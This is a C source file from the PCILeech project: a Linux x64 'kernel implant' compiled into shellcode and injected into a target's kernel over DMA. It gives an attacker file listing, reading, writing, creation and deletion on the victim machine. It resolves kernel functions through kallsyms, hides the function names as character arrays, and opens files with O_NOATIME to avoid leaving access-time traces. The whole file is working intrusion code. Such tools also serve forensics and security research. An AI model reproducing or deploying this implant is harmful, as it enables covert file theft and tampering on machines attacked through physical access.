// lx64_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_vfs.c
// ml64 lx64_common_a.asm /Felx64_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_vfs.obj lx64_common.obj
// shellcode64.exe -o lx64_vfs.exe
// 

#include "lx64_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_CREAT         00000100
#define O_TRUNC         00001000
#define O_APPEND        00002000
#define O_DIRECTORY     00200000
#define O_NOATIME       01000000

#define DT_UNKNOWN      0
#define DT_FIFO         1
#define DT_CHR          2
#define DT_DIR          4
#define DT_BLK          6
#define DT_REG          8
#define DT_LNK          10
#define DT_SOCK         12
#define DT_WHT          14

struct timespec {
	QWORD	tv_sec;		// seconds
	QWORD	tv_nsec;	// nanoseconds
};

struct kstat {
	QWORD	ino;
	DWORD	dev;
	DWORD	mode;
	DWORD	nlink;
	DWORD	uid;
	DWORD	gid;
	DWORD	rdev;
	QWORD	size;	// offset 0x20
	struct timespec atime;
	struct timespec mtime;
	struct timespec ctime;
	QWORD	blksize;
	QWORD	blocks;
	QWORD	_pcileech_dummy_extra[2];
};

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

typedef struct tdFN2 {
	QWORD str_sys_unlink;
	QWORD memcpy;
	QWORD memset;
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_read;
	QWORD vfs_write;
	QWORD vfs_stat;
	QWORD iterate_dir;
	QWORD yield;
} FN2, *PFN2;

typedef struct tdDIR_CONTEXT {
	QWORD actor;
	QWORD pos;
} DIR_CONTEXT;

typedef struct tdDIR_CONTEXT_EXTENDED {
	DIR_CONTEXT ctx;
	PKMDDATA pk;
	PFN2 fn;
	PVFS_OPERATION pop;
	QWORD buf[];
} DIR_CONTEXT_EXTENDED, *PDIR_CONTEXT_EXTENDED;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)];
	NAMES[i++] = (QWORD)(CHAR[]) { 's', 'y', 's', '_', 'u', 'n', 'l', 'i', 'n', 'k', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 's', 'e', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 'w', 'r', 'i', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'i', 't', 'e', 'r', 'a', 't', 'e', '_', 'd', 'i', 'r', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'y', 'i', 'e', 'l', 'd', 0 };
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, i);
}

static int VfsList_CallbackIterateDir(PDIR_CONTEXT_EXTENDED ctx, const char *name, int len, unsigned __int64 pos, unsigned __int64 ino, unsigned int d_type)
{
	UNREFERENCED_PARAMETER(ino);
	UNREFERENCED_PARAMETER(pos);
	QWORD i;
	PVFS_RESULT_FILEINFO pfi;
	if(ctx->pk->dataOutExtraLength + sizeof(VFS_RESULT_FILEINFO) > ctx->pk->dataOutExtraLengthMax) {
		return 0;
	}
	pfi = (PVFS_RESULT_FILEINFO)(ctx->pk->DMAAddrVirtual + ctx->pk->dataOutExtraOffset + ctx->pk->dataOutExtraLength);
	SysVCall(ctx->fn->memset, pfi, 0, sizeof(VFS_RESULT_FILEINFO));
	switch(d_type) {
		case DT_REG:
			pfi->flags = VFS_FLAGS_FILE_NORMAL;
			break;
		case DT_DIR:
			pfi->flags = VFS_FLAGS_FILE_DIRECTORY;
			break;
		case DT_LNK:
			pfi->flags = VFS_FLAGS_FILE_SYMLINK;
			break;
		default:
			pfi->flags = VFS_FLAGS_FILE_OTHER;
			break;
	}
	for(i = 0; i < len && i < MAX_PATH - 1; i++) {
		pfi->wszFileName[i] = name[i];
	}
	ctx->pk->dataOutExtraLength += sizeof(VFS_RESULT_FILEINFO);
	return 0;
}

QWORD UnixToWindowsFiletime(QWORD tv) {
	QWORD result = 11644473600ULL; // EPOCH DIFF
	result += tv;
	result *= 10000000ULL;
	return result;
}

VOID VfsList_SetSizeTime(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	QWORD i, o, p, cfi, result;
	CHAR sz[2 * MAX_PATH];
	struct kstat kstat;
	PVFS_RESULT_FILEINFO pfi;
	cfi = pk->dataOutExtraLength / sizeof(VFS_RESULT_FILEINFO);
	for(o = 0; o < MAX_PATH; o++) {
		if(0 == pop->szFileName[o]) { break; }
		sz[o] = pop->szFileName[o];
	}
	sz[o] = '/';
	o++;
	pk->dataOut[2] = cfi;
	for(p = 0; p < cfi; p++) {
		pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + p * sizeof(VFS_RESULT_FILEINFO));
		// set filename
		for(i = 0; i < MAX_PATH; i++) {
			if(0 == pfi->wszFileName[i]) { break; }
			sz[o + i] = (CHAR)pfi->wszFileName[i];
		}
		sz[o + i] = 0;
		result = SysVCall(pfn2->vfs_stat, sz, &kstat);
		if(0 == result) {
			pfi->cb = kstat.size;
			pfi->tAccessOpt = UnixToWindowsFiletime(kstat.atime.tv_sec);
			pfi->tCreateOpt = UnixToWindowsFiletime(kstat.ctime.tv_sec);
			pfi->tModifyOpt = UnixToWindowsFiletime(kstat.mtime.tv_sec);
		}
		if(0 == (p % 50)) { SysVCall(pfn2->yield); } // yield at intervals to avoid problems...
	}
}

STATUS VfsList(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	DIR_CONTEXT_EXTENDED dce;
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_RDONLY | O_DIRECTORY | O_NOATIME, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	WinCallSetFunction((QWORD)VfsList_CallbackIterateDir);
	dce.ctx.actor = (QWORD)WinCall;
	dce.fn = pfn2;
	dce.pk = pk;
	dce.pop = pop;
	pk->dataOut[1] = SysVCall(pfn2->iterate_dir, hFile, &dce);
	SysVCall(pfn2->filp_close, hFile, NULL);
	SysVCall(pfn2->yield);
	VfsList_SetSizeTime(pk, pfn2, pop);
	return STATUS_SUCCESS;
}

STATUS VfsDelete(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD result;
	result = SysVCall(pfn2->str_sys_unlink, pop->szFileName);
	return result ? STATUS_FAIL_ACTION : STATUS_SUCCESS;
}

STATUS VfsRead(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_RDONLY | O_NOATIME, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	pk->dataOutExtraLength = SysVCall(pfn2->vfs_read, hFile, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax, &pop->offset);
	SysVCall(pfn2->filp_close, hFile, NULL);
	return (pk->dataOutExtraLength <= pk->dataOutExtraLengthMax) ? STATUS_SUCCESS : STATUS_FAIL_ACTION;
}

STATUS VfsWrite(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD hFile, flags = 0, result;
	flags |= O_WRONLY | O_NOATIME;
	flags |= (pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) ? O_TRUNC : 0;
	flags |= (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? O_APPEND : 0;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, flags, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	result = SysVCall(pfn2->vfs_write, hFile, pop->pb, pop->cb, &pop->offset);
	SysVCall(pfn2->filp_close, hFile, NULL);
	return result ? STATUS_FAIL_ACTION : STATUS_SUCCESS;
}

STATUS VfsCreate(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_CREAT | O_WRONLY | O_TRUNC, 0x1ff /*-rwxrwxrwx*/);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	SysVCall(pfn2->filp_close, hFile, NULL);
	return STATUS_SUCCESS;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	PVFS_OPERATION pop;
	FN2 fn2;
	// initialize kernel functions
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC) || (pop->flags & VFS_FLAGS_UNICODE)) {
		pk->dataOut[0] = STATUS_FAIL_SIGNATURE_NOT_FOUND;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, &fn2, pop);
		return;
	}
}
